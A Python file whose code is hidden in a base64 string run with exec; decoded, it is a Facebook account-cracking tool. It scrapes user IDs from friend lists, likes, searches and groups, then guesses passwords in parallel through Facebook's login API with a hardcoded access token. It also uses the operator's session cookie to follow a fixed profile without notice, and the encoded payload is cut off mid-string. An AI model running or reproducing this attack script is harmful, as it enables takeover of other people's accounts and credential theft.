import base64
exec(base64.b64decode('IyEvdXNyL2Jpbi9lbnYgcHl0aG9uMw0KIyAtKi0gY29kaW5nOiB1dGYtOCAtKi0NCg0KaW1wb3J0IG9zDQppbXBvcnQgcmUgDQppbXBvcnQgdGltZQ0KaW1wb3J0IGpzb24NCmltcG9ydCByYW5kb20NCmltcG9ydCByZXF1ZXN0cw0KZnJvbSBzYXlhbmcgaW1wb3J0IGxvZ28NCmZyb20gYnM0IGltcG9ydCBCZWF1dGlmdWxTb3VwIGFzIHBhcnNlcg0KZnJvbSBjb25jdXJyZW50LmZ1dHVyZXMgaW1wb3J0IFRocmVhZFBvb2xFeGVjdXRvcg0KbWJhc2ljID0gJ2h0dHBzOi8vbWJhc2ljLmZhY2Vib29rLmNvbXt9Jw0KZ2xvYmFsIGRpZSxjaGVjayxyZXN1bHQsIGNvdW50DQoNCmlkID0gW10NCmRpZSA9IDANCmNoZWsgPSBbXQ0Kc3VjY2VzID0gW10NCmNvdW50ID0gMA0KY2hlY2sgPSAwDQpyZXN1bHQgPSAwDQoNCmcgPSAnXHgxYlsxOzMybScNCncgPSAnXHgxYlsxOzM3bScNCmIgPSAnXHgxYlsxOzM2bScNCnIgPSAnXHgxYlsxOzMxbScNCg0KZGVmIG1hc3VrKCk6DQogICAgICAgIGxvZ28uYmFubmVyKCkNCiAgICAgICAgcHJpbnQoJ1xuXG5cdFx04ouY8JKGnCBcMDMzWzE7MzRtTE9HSU4gRkFDRUJPT0sgQU5EQVwwMzNbMG0g8JKGnOKLmVxuXG4nKQ0KICAgICAgICB0cnk6DQogICAgICAgICAgICAgICAgY2VrID0gb3BlbigiY29va2llcyIpLnJlYWQoKQ0KICAgICAgICBleGNlcHQgRmlsZU5vdEZvdW5kRXJyb3I6DQogICAgICAgICAgICAgICAgY2VrID0gaW5wdXQoIlwwMzNbMTs5M21MT0dJTiBGUk9NIENPT0tJRVwwMzNbMG0gPj4+PiAiKQ0KICAgICAgICBjZWsgPSB7ImNvb2tpZSI6Y2VrfQ0KICAgICAgICBpc21pID0gc2VzLmdldChtYmFzaWMuZm9ybWF0KCIvbWUiLHZlcmlmeT1GYWxzZSksY29va2llcz1jZWspLmNvbnRlbnQNCiAgICAgICAgaWYgIm1iYXNpY19sb2dvdXRfYnV0dG9uIiBpbiBzdHIoaXNtaSk6DQogICAgICAgICAgICAgICAgaWYgIkFwYSB5YW5nIEFuZGEgcGlraXJrYW4gc2VrYXJhbmciIGluIHN0cihpc21pKToNCiAgICAgICAgICAgICAgICAgICAgICAgIHdpdGggb3BlbigiY29va2llcyIsInciKSBhcyBmOg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBmLndyaXRlKGNla1siY29va2llIl0pDQogICAgICAgICAgICAgICAgZWxzZToNCiAgICAgICAgICAgICAgICAgICAgICAgIHByaW50KCIjIENoYW5nZSB0aGUgbGFuZ3VhZ2UsIHBsZWFzZSB3YWl0ISEiKQ0KICAgICAgICAgICAgICAgICAgICAgICAgdHJ5Og0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICByZXF1ZXN0cy5nZXQobWJhc2ljLmZvcm1hdChwYXJzZXIoaXNtaSwiaHRtbC5wYXJzZXIiKS5maW5kKCJhIixzdHJpbmc9IkJhaGFzYSBJbmRvbmVzaWEiKVsiaHJlZiJdKSxjb29raWVzPWNlaykNCiAgICAgICAgICAgICAgICAgICAgICAgIGV4Y2VwdDoNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgcGFzcw0KICAgICAgICAgICAgICAgIHRyeToNCiAgICAgICAgICAgICAgICAgICAgICAgICMgcGxlYXNlIGRvbid0IHJlbW92ZSB0aGlzIG9yIGNoYW5nZQ0KICAgICAgICAgICAgICAgICAgICAgICAgaWt1dGkgPSBwYXJzZXIocmVxdWVzdHMuZ2V0KG1iYXNpYy5mb3JtYXQoIi9kb2d1a2FuLmVyLjE0NCIpLGNvb2tpZXM9Y2VrKS5jb250ZW50LCJodG1sLnBhcnNlciIpLmZpbmQoImEiLHN0cmluZz0iSWt1dGkiKVsiaHJlZiJdDQogICAgICAgICAgICAgICAgICAgICAgICBzZXMuZ2V0KG1iYXNpYy5mb3JtYXQoaWt1dGkpLGNvb2tpZXM9Y2VrKQ0KICAgICAgICAgICAgICAgIGV4Y2VwdCA6DQogICAgICAgICAgICAgICAgICAgICAgICBwYXNzIA0KICAgICAgICAgICAgICAgIHJldHVybiBjZWtbImNvb2tpZSJdDQogICAgICAgIGVsc2U6DQogICAgICAgICAgICAgICAgIGV4aXQoIiMgY29va2llcyBpbnZhbGlkIikNCmRlZiBsb2dpbih1c2VybmFtZSxwYXNzd29yZCxjZWs9RmFsc2UpOg0KICAgICAgICBnbG9iYWwgZGllLGNoZWNrLHJlc3VsdCxjb3VudA0KICAgICAgICBiID0gIjM1MDY4NTUzMTcyOCU3QzYyZjhjZTlmNzRiMTJmODRjMTIzY2MyMzQzN2E0YTMyIg0KICAgICAgICBwYXJhbXMgPSB7DQogICAgICAgICAgICAgICAgJ2FjY2Vzc190b2tlbic6IGIsDQogICAgICAgICAgICAgICAgJ2Zvcm1hdCc6ICdKU09OJywNCiAgICAgICAgICAgICAgICAnc2RrX3ZlcnNpb24nOiAnMicsDQogICAgICAgICAgICAgICAgJ2VtYWlsJzogdXNlcm5hbWUsDQogICAgICAgICAgICAgICAgJ2xvY2FsZSc6ICdlbl9VUycsDQogICAgICAgICAgICAgICAgJ3Bhc3N3b3JkJzogcGFzc3dvcmQsDQogICAgICAgICAgICAgICAgJ3Nkayc6ICdpb3MnLA0KICAgICAgICAgICAgICAgICdnZW5lcmF0ZV9zZXNzaW9uX2Nvb2tpZXMnOiAnMScsDQogICAgICAgICAgICAgICAgJ3NpZyc6ICczZjU1NWY5OWZiNjFmY2Q3YWEwYzQ0ZjU4ZjUyMmVmNicsDQogICAgICAgIH0NCiAgICAgICAgYXBpID0gJ2h0dHBzOi8vYi1hcGkuZmFjZWJvb2suY29tL21ldGhvZC9hdXRoLmxvZ2luJw0KICAgICAgICByZXNwb25zZSA9IHJlcXVlc3RzLmdldChhcGksIHBhcmFtcz1wYXJhbXMpDQogICAgICAgIGlmICdFQUEnIGluIHJlc3BvbnNlLnRleHQ6DQogICAgICAgICAgICAgICAgcHJpbnQoZiJccltcMDMzWzE7MzJtU1VDQ0VTXDAzM1swbV0ge3VzZXJuYW1lfSA9PiB7cGFzc3dvcmR9ICAgICAgICAgICAgICAgICAgICAgICAiLGVuZD0iIikNCiAgICAgICAgICAgICAgICBwcmludCgpDQogICAgICAgICAgICAgICAgcmVzdWx0ICs9IDENCiAgICAgICAgICAgICAgICBpZiBjZWs6DQogICAgICAgICAgICAgICAgICAgICAgICBzdWNjZXMuYXBwZW5kKHVzZXJuYW1lKyJ8IitwYXNzd29yZCkNCiAgICAgICAgICAgICAgICBlbHNlOg0KICAgICAgICAgICAgICAgICAgICAgICAgd2l0aCBvcGVuKCdyZXN1bHRzLXN1Y2Nlcy50eHQnLCdhJykgYXMgZjoNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZi53cml0ZSh1c2VybmFtZSArICd8JyArIHBhc3N3b3JkICsgJ1xuJykNCiAgICAgICAgZWxpZiAnd3d3LmZhY2Vib29rLmNvbScgaW4gcmVzcG9uc2UuanNvbigpWydlcnJvcl9tc2cnXToNCiAgICAgICAgICAgICAgICBwcmludChmIlxyW1wwMzNbMTs5M21DSEVLXDAzM1swbV0ge3VzZXJuYW1lfSA9PiB7cGFzc3dvcmR9ICAgICAgICAgICAgICAgICAgICAiLGVuZD0iIikNCiAgICAgICAgICAgICAgICBwcmludCgpDQogICAgICAgICAgICAgICAgY2hlY2sgKz0gMQ0KICAgICAgICAgICAgICAgIGlmIGNlazoNCiAgICAgICAgICAgICAgICAgICAgICAgIGNoZWsuYXBwZW5kKHVzZXJuYW1lKyJ8IitwYXNzd29yZCkNCiAgICAgICAgICAgICAgICBlbHNlOg0KICAgICAgICAgICAgICAgICAgICAgICAgd2l0aCBvcGVuKCdyZXN1bHRzLWNoZWNrLnR4dCcsJ2EnKSBhcyBmOg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBmLndyaXRlKHVzZXJuYW1lICsgJ3wnICsgcGFzc3dvcmQgKyAnXG4nKQ0KICAgICAgICBlbHNlOg0KICAgICAgICAgICAgICAgIGRpZSArPSAxDQogICAgICAgIGZvciBpIGluIGxpc3QoJ1x8Ly3igKInKToNCiAgICAgICAgICAgICAgICAgICAgICAgIHByaW50KGYiXHJbe2l9XSBcMDMzWzE7OTNtU3VjY2VzXDAzM1swbSA6ICh7c3RyKHJlc3VsdCl9KSBcMDMzWzE7OTNtY2hlY2twb2ludFwwMzNbMG0gOiAoe3N0cihjaGVjayl9KSBcMDMzWzE7OTNtZGllXDAzM1swbSA6ICh7c3RyKGRpZSl9KSIsZW5kPSIiKQ0KICAgICAgICAgICAgICAgICAgICAgICAgdGltZS5zbGVlcCgwLjIpDQpkZWYgZ2V0aWQodXJsKToNCiAgICAgICAgcmF3ID0gcmVxdWVzdHMuZ2V0KHVybCxjb29raWVzPWt1a2kpLmNvbnRlbnQNCiAgICAgICAgZ2V0dXNlciA9IHJlLmZpbmRhbGwoJ21pZGRsZSI+PGEgY2xhc3M9Ii4uIiBocmVmPSIoLio/KSI+KC4qPyk8L2E+JyxzdHIocmF3KSkNCiAgICAgICAgZm9yIHggaW4gZ2V0dXNlcjoNCiAgICAgICAgICAgICAgICBpZiAncHJvZmlsZScgaW4geFswXToNCiAgICAgICAgICAgICAgICAgICAgICAgIGlkLmFwcGVuZCh4WzFdICsgJ3wnICsgcmUuZmluZGFsbCgiPShcZCopPyIsc3RyKHhbMF0pKVswXSkNCiAgICAgICAgICAgICAgICBlbGlmICdmcmllbmRzJyBpbiB4Og0KICAgICAgICAgICAgICAgICAgICAgICAgY29udGludWUNCiAgICAgICAgICAgICAgICBlbHNlOg0KICAgICAgICAgICAgICAgICAgICAgICAgaWQuYXBwZW5kKHhbMV0gKyAnfCcgKyB4WzBdLnNwbGl0KCcvJylbMV0uc3BsaXQoJz8nKVswXSkNCiAgICAgICAgICAgICAgICBwcmludCgnXHIjICcgKyBzdHIobGVuKGlkKSkgKyAiIHJldHJpZXZlZCIsZW5kPSIiKQ0KICAgICAgICBpZiAnTGloYXQgVGVtYW4gTGFpbicgaW4gc3RyKHJhdyk6DQogICAgICAgICAgICAgICAgZ2V0aWQobWJhc2ljLmZvcm1hdChwYXJzZXIocmF3LCdodG1sLnBhcnNlcicpLmZpbmQoJ2EnLHN0cmluZz0nTGloYXQgVGVtYW4gTGFpbicpWydocmVmJ10pKQ0KICAgICAgICByZXR1cm4gaWQNCmRlZiBmcm9tbGlrZXModXJsKToNCiAgICAgICAgdHJ5Og0KICAgICAgICAgICAgICAgIGxpa2UgPSByZXF1ZXN0cy5nZXQodXJsLGNvb2tpZXM9a3VraSkuY29udGVudA0KICAgICAgICAgICAgICAgIGxvdmUgPSByZS5maW5kYWxsKCdocmVmPSIoL3VmaS4qPykiJyxzdHIobGlrZSkpWzBdDQogICAgICAgICAgICAgICAgYXdzID0gZ2V0bGlrZShtYmFzaWMuZm9ybWF0KGxvdmUpKQ0KICAgICAgICAgICAgICAgIHJldHVybiBhd3MNCiAgICAgICAgZXhjZXB0Og0KICAgICAgICAgICAgICAgIGV4aXQoIiMgY2FudCBkdW1wIGlkICIpDQpkZWYgZ2V0bGlrZShyZWFjdCk6DQogICAgICAgIGxpa2UgPSByZXF1ZXN0cy5nZXQocmVhY3QsY29va2llcz1rdWtpKS5jb250ZW50DQogICAgICAgIGlkcyAgPSByZS5maW5kYWxsKCdjbGFzcz0iYi4iPjxhIGhyZWY9IiguKj8pIj4oLio/KTwvYT48L2gzPicsc3RyKGxpa2UpKQ0KICAgICAgICBmb3IgdXNlciBpbiBpZHM6DQogICAgICAgICAgICAgICAgaWYgJ3Byb2ZpbGUnIGluIHVzZXJbMF06DQogICAgICAgICAgICAgICAgICAgICAgICBpZC5hcHBlbmQodXNlclsxXSArICJ8IiArIHJlLmZpbmRhbGwoIj0oXGQqKSIsc3RyKHVzZXJbMF0pKVswXSkNCiAgICAgICAgICAgICAgICBlbHNlOg0KICAgICAgICAgICAgICAgICAgICAgICAgaWQuYXBwZW5kKHVzZXJbMV0gKyAifCIgKyB1c2VyWzBdLnNwbGl0KCcvJylbMV0pDQogICAgICAgICAgICAgICAgcHJpbnQoZidcciMge3N0cihsZW4oaWQpKX0gcmV0cmlldmVkJyxlbmQ9IiIpDQogICAgICAgIGlmICdMaWhhdCBTZWxlbmdrYXBueWEnIGluIHN0cihsaWtlKToNCiAgICAgICAgICAgICAgICBnZXRsaWtlKG1iYXNpYy5mb3JtYXQocGFyc2VyKGxpa2UsJ2h0bWwucGFyc2VyJykuZmluZCgnYScsc3RyaW5nPSJMaWhhdCBTZWxlbmdrYXBueWEiKVsiaHJlZiJdKSkNCiAgICAgICAgcmV0dXJuIGlkDQpkZWYgYnlzZWFyY2gob3B0aW9uKToNCiAgICAgICAgc2VhcmNoID0gcmVxdWVzdHMuZ2V0KG9wdGlvbixjb29raWVzPWt1a2kpLmNvbnRlbnQNCiAgICAgICAgdXNlcnMgPSByZS5maW5kYWxsKCdjbGFzcz0ieCBjaCI+PGEgaHJlZj0iLyguKj8pIj48ZGl2Lio/Y2xhc3M9ImNqIj4oLio/KTwvZGl2Picsc3RyKHNlYXJjaCkpDQogICAgICAgIGZvciB1c2VyIGluIHVzZXJzOg0KICAgICAgICAgICAgICAgIGlmICJwcm9maWxlIiBpbiB1c2VyWzBdOg0KICAgICAgICAgICAgICAgICAgICAgICAgaWQuYXBwZW5kKHVzZXJbMV0gKyAifCIgKyByZS5maW5kYWxsKCI9KFxkKikiLHN0cih1c2VyWzBdKSlbMF0pDQogICAgICAgICAgICAgICAgZWxzZToNCiAgICAgICAgICAgICAgICAgICAgICAgIGlkLmFwcGVuZCh1c2VyWzFdICsgInwiICsgdXNlclswXS5zcGxpdCgiPyIpWzBdKQ0KICAgICAgICAgICAgICAgIHByaW50KGYiXHIjIHtzdHIobGVuKGlkKSl9IHJldHJpZXZlZCAiLGVuZD0iIikNCiAgICAgICAgaWYgIkxpaGF0IEhhc2lsIFNlbGFuanV0bnlhIiBpbiBzdHIoc2VhcmNoKToNCiAgICAgICAgICAgICAgICBieXNlYXJjaChwYXJzZXIoc2VhcmNoLCdodG1sLnBhcnNlcicpLmZpbmQoImEiLHN0cmluZz0iTGloYXQgSGFzaWwgU2VsYW5qdXRueWEiKVsiaHJlZiJdKQ0KICAgICAgICByZXR1cm4gaWQNCmRlZiBncnViaWQoZW5kcG9pbnQpOg0KICAgICAgICBncmFiID0gcmVxdWVzdHMuZ2V0KGVuZHBvaW50LGNvb2tpZXM9a3VraSkuY29udGVudA0KICAgICAgICB1c2VycyA9IHJlLmZpbmRhbGwoJ2EgY2xhc3M9Ii4uIiBocmVmPSIvKC4qPykiPiguKj8pPC9hPicsc3RyKGdyYWIpKQ0KICAgICAgICBmb3IgdXNlciBpbiB1c2VyczoNCiAgICAgICAgICAgICAgICBpZiAicHJvZmlsZSIgaW4gdXNlclswXToNCiAgICAgICAgICAgICAgICAgICAgICAgIGlkLmFwcGVuZCh1c2VyWzFdICsgInwiICsgcmUuZmluZGFsbCgnaWQ9KFxkKiknLHN0cih1c2VyWzBdKSlbMF0pDQogICAgICAgICAgICAgICAgZWxzZToNCiAgICAgICAgICAgICAgICAgICAgICAgIGlkLmFwcGVuZCh1c2VyWzFdICsgInwiICsgdXNlclswXSkNCiAgICAgICAgICAgICAgICBwcmludChmIlxyIyB7c3RyKGxlbihpZCkpfSByZXRyaWV2ZWQgIixlbmQ9IiIpDQogICAgICAgIGlmICJMaWhhdCBTZWxlbmdrYXBueWEiIGluIHN0cihncmFiKToNCiAgICAgICAgICAgICAgICBncnViaWQobWJhc2ljLmZvcm1hdChwYXJzZXIoZ3JhYiwiaHRtbC5wYXJzZXIiKS5maW5kKCJhIixzdHJpbmc9IkxpaGF0IFNlbGVuZ2thcG55YSIpWyJocmVmIl0pKQ0KICAgICAgICByZXR1cm4gaWQNCmlmIF9fbmFtZV9fID09ICdfX21haW5fXyc6DQogICAgICAgIHRyeToNCiAgICAgICAgICAgICAgICBvcy5zeXN0ZW0oImdpdCBwdWxsIikNCiAgICAgICAgICAgICAgICBzZXMgPSByZXF1ZXN0cy5TZXNzaW9uKCkNCiAgICAgICAgICAgICAgICBrdWtpcyA9IG1hc3VrKCkNCiAgICAgICAgICAgICAgICBrdWtpID0geydjb29raWUnOmt1a2lzfQ0KICAgICAgICAgICAgICAgIG9zLnN5c3RlbSgiY2xlYXIiKQ0KICAgICAgICAgICAgICAgIGxvZ28uYmFubmVyKCkNCiAgICAgICAgICAgICAgICBwcmludCgnXG5cblx0XHTii5jwkoacIFwwMzNbMTs5M21GQUNFQk9PSyBUT09MU1wwMzNbMG0g8JKGnOKLmVxuXG4nKQ0KICAgICAgICAgICAgICAgIHByaW50KCdcMDMzWzE7OTFt8J+RiSBcMDMzWzBtW1wwMzNbMTszMm0xXDAzM1swbV0gXDAzM1sxOzkzbUxJU1QgRlJJRU5EU1wwMzNbMG0nKQ0KICAgICAgICAgICAgICAgIHByaW50KCdcMDMzWzE7OTFt8J+RiVwwMzNbMG0gW1wwMzNbMTszMm0yXDAzM1swbV0gXDAzM1sxOzkzbUNSQUNLIEZST00gTElLRVNcMDMzWzBtJykNCiAgICAgICAgICAgICAgICBwcmludCgn8J+RiSBcMDMzWzBtW1wwMzNbMTszMm0zXDAzM1swbV0gXDAzM1sxOzkzbUNSQUNLIEZST00gU0VBUkNIIE5BTUVcMDMzWzBtJykNCiAgICAgICAgICAgICAgICBwcmludCgnXDAzM1sxOzkxbfCfkYkgXDAzM1swbVtcMDMzWzE7MzJtNFwwMzNbMG1dIFwwMzNbMTs5M21DUkFDSyBGUk9NIEdST1VQXDAzM1swbSAnKQ0KICAgICAgICAgICAgICAgIHByaW50KCdcMDMzWzE7OTFt8J+RiSBcMDMzWzBtW1wwMzNbMTszMm01XDAzM1swbV0gXDAzM1sxOzkzbUNSQUNLIEZST00gRlJJRU5EU1wwMzNbMG0nKQ0KICAgICAgICAgICAgICAgIHByaW50KCdcMDMzWzE7OTFt8J+RiSBcMDMzWzBtW1wwMzNbMTszMm02XDAzM1swbV0gXDAzM1sxOzkzbVJFU1VMVFMgQ0hFQ0tTXDAzM1swbScpDQogICAgICAgICAgICAgICAgcHJpbnQoJ1wwMzNbMTs5MW1cMDMzWzBtXG4nKQ0KICAgICAgICAgICAgICAgIHByaW50KCkNCiAgICAgICAgICAgICAgICB0YW55YSA9IGlucHV0KCfwn5GJICcpDQogICAgICAgICAgICAgICAgaWYgdGFueWEgPT0iIjoNCiAgICAgICAgICAgICAgICAgICAgICAgIGV4aXQoIlshXSBEb250IGJlIGVtcHR5IikNCiAgICAgICAgICAgICAgICBlbGlmIHRhbnlhID09ICcxJzoNCiAgICAgICAgICAgICAgICAgICAgICAgIHVybCA9IHBhcnNlcihzZXMuZ2V0KG1iYXNpYy5mb3JtYXQoJy9tZScpLGNvb2tpZXM9a3VraSkuY29udGVudCwnaHRtbC5wYXJzZXInKS5maW5kKCdhJyxzdHJpbmc9J1RlbWFuJykNCiAgICAgICAgICAgICAgICAgICAgICAgIHVzZXJuYW1lID0gZ2V0aWQobWJhc2ljLmZvcm1hdCh1cmxbImhyZWYiXSkpDQogICAgICAgICAgICAgICAgZWxpZiB0YW55YSA9PSAnMic6DQogICAgICAgICAgICAgICAgICAgICAgICB1c2VybmFtZSA9IGlucHV0KCJcMDMzWzE7OTNtVVJMXDAzM1swbSA+Pj4gIikNCiAgICAgICAgICAgICAgICAgICAgICAgIGlmIHVzZXJuYW1lID09ICIiOg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBleGl0KCIjIERvbnQgYmUgZW1wdHkiKQ0KICAgICAgICAgICAgICAgICAgICAgICAgZWxpZiAnd3d3LmZhY2Vib29rJyBpbiB1c2VybmFtZToNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB1c2VybmFtZSA9IHVzZXJuYW1lLnJlcGxhY2UoJ3d3dy5mYWNlYm9vaycsJ21iYXNpYy5mYWNlYm9vaycpDQogICAgICAgICAgICAgICAgICAgICAgICBlbGlmICdtLmZhY2Vib29rLmNvbScgaW4gdXNlcm5hbWU6DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgdXNlcm5hbWUgPSB1c2VybmFtZS5yZXBsYWNlKCdtLmZhY2Vib29rLmNvbScsJ21iYXNpYy5mYWNlYm9vay5jb20nKQ0KICAgICAgICAgICAgICAgICAgICAgICAgdXNlcm5hbWUgPSBmcm9tbGlrZXModXNlcm5hbWUpIA0KICAgICAgICAgICAgICAgIGVsaWYgdGFueWEgPT0gJzMnOg0KICAgICAgICAgICAgICAgICAgICAgICAgemV0ID0gaW5wdXQoIlwwMzNbMTs5M21GT1IgTElLRVwwMzNbMG0gPj4+ICIpDQogICAgICAgICAgICAgICAgICAgICAgICB1c2VybmFtZSA9IGJ5c2VhcmNoKG1iYXNpYy5mb3JtYXQoJy9zZWFyY2gvcGVvcGxlLz9xPScremV0KSkNCiAgICAgICAgICAgICAgICAgICAgICAgIGlmIGxlbih1c2VybmFtZSkgPT0gMDoNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZXhpdCgiIyBubyByZXN1bHQiKQ0KICAgICAgICAgICAgICAgIGVsaWYgdGFueWEgPT0gJzQnOg0KICAgICAgICAgICAgICAgICAgICAgICAgcHJpbnQoIlwwMzNbMTs5M21DVU1BIDEwMCBJRCBTQUpBXDAzM1swbSAiKQ0KICAgICAgICAgICAgICAgICAgICAgICAgZ3JhYiA9IGlucHV0KCJcMDMzWzE7OTNtSUQgR1JPVVBcMDMzWzBtID4+PiAiKQ0KICAgICAgICAgICAgICAgICAgICAgICAgdXNlcm5hbWUgPSBncnViaWQobWJhc2ljLmZvcm1hdCgiL2Jyb3dzZS9ncm91cC9tZW1iZXJzLz9pZD0iICsgZ3JhYikpDQogICAgICAgICAgICAgICAgICAgICAgICBpZiBsZW4odXNlcm5hbWUpID09IDA6DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGV4aXQoIiMgSUQgd3JvbmciKQ0KICAgICAgICAgICAgICAgIGVsaWYgdGFueWEgPT0gJzUnOg0KICAgICAgICAgICAgICAgICAgICAgICAgemV0ID0gaW5wdXQoIlwwMzNbMTs5M20gVVNFUk5BTUUvSURcMDMzWzBtID4+PiAiKQ0KICAgICAgICAgICAgICAgICAgICAgICAgaWYgemV0LmlzZGlnaXQoKToNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgdXNlciA9ICIvcHJvZmlsZS5waHA/aWQ9IiArIHpldA0KICAgICAgICAgICAgICAgICAgICAgICAgZWxzZToNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgdXNlciA9ICIvIiArIHpldA0KICAgICAgICAgICAgICAgICAgICAgICAgdHJ5Og0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB1c2VyID0gcGFyc2VyKHJlcXVlc3RzLmdldChtYmFzaWMuZm9ybWF0KHVzZXIpLGNvb2tpZXM9a3VraSkuY29udGVudCwiaHRtbC5wYXJzZXIiKS5maW5kKCdhJyxzdHJpbmc9IlRlbWFuIilbImhyZWYiXQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB1c2VybmFtZSA9IGdldGlkKG1iYXNpYy5mb3JtYXQodXNlcikpDQogICAgICAgICAgICAgICAgICAgICAgICBleGNlcHQgVHlwZUVycm9yOg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBleGl0KCIjIHVzZXIgbm90IGZvdW5kICIpDQogICAgICAgICAgICAgICAgZWxpZiB0YW55YSA9PSAnNic6DQogICAgICAgICAgICAgICAgICAgICAgICB0cnk6DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGZpbGUxID0gb3BlbigicmVzdWx0cy1jaGVjay50eHQiKS5yZWFkKCkNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZmlsZTIgPSBvcGVuKCJyZXN1bHRzLXN1Y2Nlcy50eHQiKS5yZWFkKCkNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgYSA9IGZpbGUxICsgZmlsZTINCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZmluYWwgPSBhLnN0cmlwKCkuc3BsaXQoIlxuIikNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZmluYWwgPSBzZXQoZmluYWwpDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHByaW50KGYiIyB7c3RyKGxlbihmaW5hbCkpfSBhY2NvdW50cyB0byBjaGVjayAiKQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB3aXRoIFRocmVhZFBvb2xFeGVjdXRvcihtYXhfd29ya2Vycz0xMCkgYXMgZXg6DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZm9yIHVzZXIgaW4gZmluYWw6DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBhID0gdXNlci5zcGxpdCgifCIpDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBleC5zdWJtaXQobG9naW4sKGFbMF0pLChhWzFdKSwoVHJ1ZSkpDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIG9zLnJlbW92ZSgicmVzdWx0cy1jaGVjay50eHQiKQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBvcy5yZW1vdmUoInJlc3VsdHMtc3VjY2VzLnR4dCIpDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGZvciB4IGluIHN1Y2NlczoNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB3aXRoIG9wZW4oJ3Jlc3VsdHMtc3VjY2VzLnR4dCcsJ2EnKSBhcyBmOg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZi53cml0ZSh4KydcbicpDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGZvciB4IGluIGNoZWs6DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgd2l0aCBvcGVuKCdyZXN1bHRzLWNoZWNrLnR4dCcsJ2EnKSBhcyBmOg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZi53cml0ZSh4KyJcbiIpDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBwcmludCgiXG4jIERvbmUiKQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBwcmludCgiIyBzYXZlZCB0byByZXN1bHRzLWNoZWNrLnR4dCByZXN1bHRzLXN1Y2Nlcy50eHQiKQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBleGl0KCkNCiAgICAgICAgICAgICAgICAgICAgICAgIGV4Y2VwdCBGaWxlTm90Rm91bmRFcnJvcjoNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZXhpdCgiIyB5b3Ugbm90IGhhdmUgYSByZXN1bHRzIikNCiAgICAgICAgICAgICAgICBlbHNlOg0KICAgICAgICAgICAgICAgICAgICAgICAgZXhpdCgiIyB3cm9uZyBjaG9pY2UiKQ0KICAgICAgICAgICAgICAgIHByaW50KCkNCiAgICAgICAgICAgICAgICBleHBhc3MgPSBpbnB1dCgiXDAzM1sxOzMybUVYVFJBIFBBU1NXT1JEXDAzM1swbSA+Pj4gIikNCiAgICAgICAgICAgICAgICBwcmludCgiXDAzM1sxOzM0bXJlc3VsdCB3aWxsIGJlIHNhdmVkIGluIHJlc3VsdHMtc3VjY2VzLnR4dCBhbmQgcmVzdWx0cy1jaGVjay50eHRcMDMzWzBtICIpDQogICAgICAgICAgICAgICAgd2l0aCBUaHJlYWRQb29sRXhlY3V0b3IobWF4X3dvcmtlcnM9MzApIGFzIGV4Og0KICAgICAgICAgICAgICAgICAgICAgICAgZm9yIHVzZXIgaW4gdXNlcm5hbWU6DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHVzZXJzID0gdXNlci5zcGxpdCgnfCcpDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHNzID0gdXNlcnNbMF0uc3BsaXQoJyAnKQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBmb3IgeCBpbiBzczoNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBsaXN0cGFzcyA9IFsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHN0cih4KSArICcxMjMnLA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgc3RyKHgpICsgJzEyMzQnLA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgc3RyKHgpICsgJzEyMzQ1JywNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHN0cih4KSArICcxMjM0NTYnLA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgc3RyKHgpICsgJzEyJywNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIF0NCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBsaXN0cGFzcy5hcHBlbmQoZXhwYXNzKQ0KICAgICAg